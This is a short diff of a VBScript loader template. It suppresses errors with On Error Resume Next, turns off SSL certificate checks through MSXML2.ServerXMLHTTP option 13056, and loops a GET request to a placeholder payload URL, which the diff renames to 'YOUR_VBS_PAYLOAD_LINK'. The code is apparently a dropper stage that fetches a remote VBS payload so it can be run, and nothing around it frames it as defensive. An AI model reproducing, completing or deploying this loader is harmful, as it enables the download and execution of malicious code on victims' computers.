@@ -2,7 +2,7 @@ On Error Resume Next:
 Set a=CreateObject("MSXML2.ServerXMLHTTP.6.0"):
 	a.setOption 2,13056:
 while(Len(b) = 0):
-	a.open"GET","VBS_PAYLOAD_LINK",False:
+	a.open"GET","YOUR_VBS_PAYLOAD_LINK",False:
 	a.send:
 	
 	b = a.responseText:
